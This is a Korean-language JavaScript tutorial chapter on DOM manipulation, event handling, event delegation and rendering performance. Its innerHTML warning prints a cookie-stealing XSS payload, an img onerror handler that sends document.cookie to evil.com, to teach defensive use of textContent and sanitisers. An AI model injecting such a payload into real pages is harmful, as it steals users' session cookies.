📋 NodeList는 배열이 아닙니다

const items = document.querySelectorAll("li");
items.forEach(...)          // ✅ forEach는 있습니다
items.map(...)              // ❌ TypeError — map은 없습니다

[...items].map(...)         // ✅ 배열로 변환
Array.from(items).map(...)  // ✅ 같은 뜻

또 querySelectorAll의 결과는 정적입니다. 이후에 요소가 추가되어도 목록에 반영되지 않습니다. 반면 getElementsByClassName은 살아 있는(live) 목록이라 자동으로 갱신됩니다. 헷갈리기 쉬우므로 querySelectorAll로 통일하는 편이 낫습니다.

☠️ innerHTML이 만드는 XSS

// 사용자가 댓글에 이렇게 입력했다면
const comment = '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">';

element.innerHTML = comment;    // ☠️ 스크립트가 실제로 실행됩니다
element.textContent = comment;  // ✅ 글자 그대로 표시될 뿐입니다

<script>만 조심하면 된다고 생각하기 쉽지만, innerHTML로 삽입된 <script>는 실행되지 않는 대신 onerror·onload 같은 속성은 실행됩니다. 막을 수 있다고 자신하지 마세요. 사용자 입력에는 textContent가 원칙입니다. 꼭 HTML을 넣어야 한다면 DOMPurify 같은 검증된 라이브러리로 정화해야 합니다(78장).

요소 만들고 넣기

const li = document.createElement("li");
li.textContent = "새 항목";
li.className = "item";
li.dataset.id = "42";          // data-id="42" 속성이 됩니다

// 넣기
list.append(li);               // 마지막 자식으로 (여러 개·문자열도 가능)
list.prepend(li);              // 첫 자식으로
target.before(li);             // 형제로 앞에
target.after(li);              // 형제로 뒤에
list.replaceChildren(li);      // 기존 자식을 전부 교체 (비우기: 인자 없이 호출)

// 제거
li.remove();

// 클래스 — className을 통째로 덮어쓰기보다 classList를 쓰세요

🎨 스타일은 클래스로 바꾸세요

el.style.xxx를 여러 줄 쓰는 대신 CSS에 상태 클래스를 정의하고 classList.toggle로 전환하는 것이 낫습니다. 스타일이 CSS 파일에 모이고, 애니메이션·미디어 쿼리·다크 모드와도 잘 어울립니다.

이벤트

button.addEventListener("click", handleClick);

// 옵션
element.addEventListener("click", fn, {
  once: true,      // 한 번만 실행하고 자동 제거
  capture: true,   // 캡처 단계에서 처리 (아래 참고)
  passive: true,   // preventDefault를 쓰지 않겠다고 약속 → 스크롤 성능 향상
  signal: controller.signal   // AbortController로 한꺼번에 제거
});

// 제거하려면 '같은 함수 참조'가 필요합니다
element.removeEventListener("click", handleClick);
element.removeEventListener("click", () => {});   // ❌ 다른 함수라 제거 안 됨

📜 스크롤 이벤트에는 passive: true

브라우저는 touchstart·wheel 핸들러가 preventDefault()를 호출할지 모르기 때문에 핸들러가 끝날 때까지 스크롤을 미룹니다. passive: true는 "안 쓸 것"이라는 약속이라, 브라우저가 즉시 스크롤을 진행합니다. 모바일 스크롤 버벅임의 흔한 원인입니다.

event.preventDefault()브라우저 기본 동작을 막습니다. 링크 이동, 폼 제출, 체크박스 토글 등

✋ stopPropagation()을 함부로 쓰지 마세요

"드롭다운이 바로 닫혀서" 같은 이유로 습관적으로 넣는 경우가 많은데, 바깥에서 문서 전체를 감시하던 다른 기능들이 조용히 망가집니다. (바깥 클릭 감지, 분석 도구, 접근성 스크립트 등) 대부분은 event.target을 검사하거나 closest()를 쓰는 것으로 해결됩니다.

이벤트 위임

목록 항목 1000개에 리스너를 1000개 붙이는 대신, 부모 하나에만 붙이고 event.target으로 판별하는 기법입니다.

🎯 위임의 세 가지 이득

  1. 메모리 — 리스너가 1000개에서 1개로.
  2. 동적 요소 — 나중에 추가된 요소도 자동으로 동작합니다. 이것이 가장 큰 이점입니다.
  3. 정리 — 요소를 지울 때 리스너를 따로 제거할 필요가 없습니다.

🎯 closest()가 핵심입니다

버튼 안에 아이콘이 있으면 event.target이 아이콘일 수 있습니다. event.target.closest("button")은 자기 자신부터 위로 올라가며 조건에 맞는 요소를 찾아 주므로 어디를 눌러도 올바른 버튼을 얻습니다.

DOM 조작 성능

// ❌ 1000번 DOM에 접근 — 매번 레이아웃 계산이 일어날 수 있습니다
for (let i = 0; i < 1000; i++) {
  list.append(createItem(i));
}

// ✅ 메모리에서 다 만든 뒤 한 번에 넣기
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  fragment.append(createItem(i));
}
list.append(fragment);   // DOM 접근 1회

📐 레이아웃 스래싱

// ❌ 읽기와 쓰기를 번갈아 하면 매번 강제로 레이아웃을 다시 계산합니다
for (const el of elements) {
  el.style.height = el.offsetHeight + 10 + "px";   // 쓰기 → 읽기 → 쓰기 …
}

// ✅ 읽기를 먼저 모두, 그다음 쓰기를 모두
const heights = elements.map(el => el.offsetHeight);      // 읽기만
elements.forEach((el, i) => el.style.height = heights[i] + 10 + "px");  // 쓰기만

offsetHeight·getBoundingClientRect()처럼 계산된 값을 읽는 속성은 브라우저가 지금 즉시 레이아웃을 확정하게 만듭니다. 쓰기 직후에 읽으면 그 계산이 매번 반복되어 심각하게 느려집니다.

🛠️ 현장 노트 — React를 쓸 거라면 이걸 왜 배우나

React는 DOM을 직접 조작하지 말라고 합니다. 그런데도 이 챕터가 필요한 이유는:

  • React도 결국 이 API를 씁니다. 원리를 알아야 이상 동작을 설명할 수 있습니다.
  • 이벤트 전파·위임은 React에서도 그대로 적용됩니다.
  • 포커스 이동, 스크롤 위치, 외부 라이브러리 연동은 ref로 직접 DOM을 다뤄야 합니다(64장).
  • textContent와 innerHTML의 차이는 React의 dangerouslySetInnerHTML이 왜 그런 이름인지 설명해 줍니다.

📌 요약

  • querySelectorAll은 정적 NodeList. 배열 메서드를 쓰려면 [...list].
  • 사용자 입력은 textContent. innerHTML은 XSS의 통로다.
  • 스타일은 el.style보다 classList로 전환한다.
  • 리스너 제거에는 같은 함수 참조가 필요하다.
  • 스크롤·터치 핸들러에는 passive: true.
  • 전파는 캡처 → 타깃 → 버블. stopPropagation()은 신중히.
  • 이벤트 위임 + closest()가 동적 목록의 정석이다.
  • 대량 삽입은 DocumentFragment. 읽기와 쓰기를 번갈아 하지 않는다.
